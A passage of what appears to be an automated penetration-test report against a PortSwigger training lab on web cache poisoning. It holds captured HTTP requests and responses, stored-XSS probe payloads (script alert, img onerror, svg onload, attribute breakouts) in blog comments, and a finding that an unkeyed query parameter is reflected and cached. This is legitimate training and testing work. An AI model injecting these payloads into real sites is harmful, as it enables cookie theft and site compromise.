                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/39.jpg">
                    <h1>The Art Of Communication</h1>
                    <p><span id=blog-author>Roger That</span> | 16 June 2026</p>
                    <hr>
                    <p>I&apos;m a bit of a Francophile, so when I travel to France I love to speak their language. I&apos;m by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of whom speak French; in fact, it&apos;s almost as though my partner refuses to speak it, he thinks we can all get by on sign language and mime.</p>
                    <p>Neither of my companions understand why I would continue to speak French when the other person is speaking English. I try to explain they want to practice their English in the same way. I speak French and they speak English, and to be honest I probably wouldn&apos;t understand a lot of what they are saying in French, as it is too fast for my comprehension.</p>
                    <p>Asking for directions isn&apos;t too hard, following the answer is, even if you do know your &apos;la gauche&apos; from your &apos;droite&apos;. The easiest option would be to hand them a map and point to your destination, or ask &apos;where am I?&apos; And get them to point at the map. But I think that&apos;s just plain rude, I like to start with a nice salutation and take it from there, even if it doesn&apos;t get me to where I want to go, just smile and wave, smile and wave. In the meantime Mr. Cynical is doing an elaborate dance, arms flailing, finger pointing with the odd preposition thrown in for good measure. It strongly resembles a game of Charades. Then there&apos;s a wave of the hand and off we trot as he says he knows where to go now. So frustrating!</p>
                    <p>I&apos;ve discovered as my memory is starting to fail me I use my hands much more when talking, and trying to remember words. This too becomes a game of charades, and quite a tricky way to conduct a conversation. It can also be quite dangerous, I have often knocked drinks over people as I become excited and animated trying to think of a word which suddenly comes to me. There has even been the odd punch in the face and poke in the eye. I have become a serial mover of potential targets, things not people. I rearrange everything on the table to keep my companions in a safe zone, then try to sit far enough away they won&apos;t be on the receiving end of my out of control limbs.</p>
                    <p>It is possible to get by on mime and gesticulation, I&apos;ve trained my dog using sign language, mostly because she won&apos;t listen to a thing I ask her to do, so in my frustration I started &apos;acting&apos; out, and things just snowballed from there. If you&apos;ve ever watched Mr. Bean then you&apos;ll know what I&apos;m talking about.</p>
                    <div/>
                    <hr>
                    <h1>Comments</h1>
                    <div class=is-warning>Comments may take some time to appear while being moderated</div>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Grace O&apos;Gawd | 21 June 2026
                        </p>
                        <p>This could be made into a book.</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Grant Anuncle | 30 June 2026
                        </p>
                        <p>My hamster just died and I&apos;m really sad. Follow me on www.funnythings.com.</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Allyoucan Pete | 30 June 2026
                        </p>
                        <p>Can we meet and talk about a collaboration?</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://test.com&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;">VXSSNAME&lt;b&gt;bold&lt;/b&gt;</a> | 05 July 2026
                        </p>
                        <p>&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://x&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;">verdictname</a> | 05 July 2026
                        </p>
                        <p>verdicttest comment body</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://vdx&quot;&gt;&lt;script&gt;alert(&apos;vdxpwn9021&apos;)&lt;/script&gt;">vdxtester</a> | 05 July 2026
                        </p>
                        <p>Great article vdxmarker9021</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://plainok.example">&quot;&gt;&lt;svg onload=alert(&apos;vdxNAME888&apos;)&gt;</a> | 05 July 2026
                        </p>
                        <p>&lt;img src=x onerror=alert(&apos;vdxCMT888&apos;)&gt;</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://verdictz&quot;&gt;&lt;script&gt;alert(&apos;VERDICTSTOREDZ9&apos;)&lt;/script&gt;">vz9</a> | 05 July 2026
                        </p>
                        <p>verdict scenario check vz9</p>
                        <p></p>
                    </section>
                    <hr>
                    <section class="add-comment">
                        <h2>Leave a comment</h2>
                        <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
                            <input required type="hidden" name="csrf" value="0SIKJ6BBQNyG8e6Ugq71XiHvV4xnTu9d">
                            <input required type="hidden" name="postId" value="1">
                            <label>Comment:</label>
                            <textarea required rows="12" cols="300" name="comment"></textarea>
                                    <label>Name:</label>
                                    <input required type="text" name="name">
                                    <label>Email:</label>
                                    <input required type="email" name="email">
                                    <label>Website:</label>
                                    <input pattern="(http:|https:).+" type="text" name="website">
                            <button class="button" type="submit">Post Comment</button>
                        </form>
                    </section>
                    <div class="is-linkback">
                        <a href="/">Back to Blog</a>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-4"></a>

### 4. [HIGH] [burp✓] Input returned in response (stored)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

✅ AI-verified by active re-test: Control GET / returned a bare canonical (//host/) with no marker; injected query umbrahandsprobeAAA111=1 was returned verbatim/unencoded inside the <link rel=canonical href='//host/?umbrahandsprobeAAA111=1'> tag in ev-mr830mxs-7d (fresh origin hit, set-cookie present) and re-served from the front cache in ev-mr831bym-7e — input reflected AND stored, matching the (stored) finding. (severity raised info→high: confirmed real, not info-only)

The name of an arbitrarily supplied URL parameter submitted to the URL / is copied into the response for the URL /.<br><br>Burp has captured the first observed location where this stored input is returned. There might be other locations within the application where the same input is returned. To identify all such locations, perform a full crawl of the application and then do a global search for the highlighted value. (confidence: CERTAIN) @ https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr82ppp1-6y` — `artifacts/_/ev-mr82ppp1-6y/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net

GET /?qlfwix7ae91l8vvqpsudhk1h58b1zyvmneb8yymn=1 HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
```

Response:

```http
HTTP/1.1 0
```

- Evidence `ev-mr830fum-7b` — `artifacts/_/ev-mr830fum-7b/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

Response:

```http
HTTP/1.1 200
age: 30
cache-control: max-age=35
connection: close
content-encoding: gzip
content-length: 3602
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr830mxs-7d` — `artifacts/_/ev-mr830mxs-7d/`

Request:

```http
GET /?umbrahandsprobeAAA111=1 HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

Response:

```http
HTTP/1.1 200
age: 0
cache-control: max-age=35
connection: close
content-encoding: gzip
content-length: 3621
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-cache: miss
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?umbrahandsprobeAAA111=1'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr831bym-7e` — `artifacts/_/ev-mr831bym-7e/`

Request:

```http
GET /?umbrastableBBB222=zzz9 HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

Response:

```http
HTTP/1.1 200
age: 32
cache-control: max-age=35
connection: close
content-encoding: gzip
content-length: 3621
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?umbrahandsprobeAAA111=1'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
